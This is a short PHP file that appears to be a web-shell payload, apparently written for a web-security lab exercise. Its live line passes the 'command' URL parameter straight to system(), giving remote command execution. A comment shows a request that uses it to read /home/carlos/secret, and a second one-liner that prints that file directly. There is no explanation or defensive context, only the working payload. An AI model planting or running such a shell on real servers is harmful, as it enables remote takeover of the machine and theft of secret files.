<?php system($_GET['command']); ?>

/*
.../script.php?command=cat%20/home/carlos/secret

<?php echo file_get_contents('/home/carlos/secret'); ?>

*/